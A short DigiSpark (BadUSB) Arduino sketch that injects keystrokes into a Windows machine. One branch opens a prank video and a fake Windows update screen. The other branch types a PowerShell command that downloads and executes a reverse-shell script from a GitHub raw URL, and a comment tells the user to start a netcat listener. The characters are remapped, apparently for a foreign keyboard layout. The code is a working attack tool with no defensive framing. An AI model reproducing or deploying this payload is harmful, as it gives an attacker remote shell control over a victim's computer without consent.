//This DigiSpark script opens up Rick Astley's - Never Gonna Give You Up and also a fake Windows update screen and then maximizes it using F11
//Or opens a Reverse Shell (you'll need netcat)

#define buttonPin 0

#include "DigiKeyboard.h"
void setup() {
  pinMode(buttonPin, INPUT);
}
void loop() {
  if (digitalRead(buttonPin) == HIGH) {
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("https>&&youtu.be&dQw4w9WgXcQ_t)43s");
    //DigiKeyboard.print("https>&&loopvideos.com&dQw4w9WgXcQ");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(3000);
    DigiKeyboard.print("http>&&fakeupdate.net&win10u&index.html");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_F11);
    for(;;){ /*empty*/ }
  } else {
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    /*DigiKeyboard.print("powershell");
    //If you want to run as admin
    //DigiKeyboard.print("powershell Start/Process powershell /Verb runAs");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(10000);*/
    //run "nc -lp 4444" on your system
    DigiKeyboard.print("powershell @IEX *New/Object Net.WebClient(.DownloadString*'https>&&raw.githubusercontent.com&zorbaproject&Guercio&master&reverseshell.ps1'(<@");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(10000);
    for (;;) {
      /*empty*/
    }
  }
}
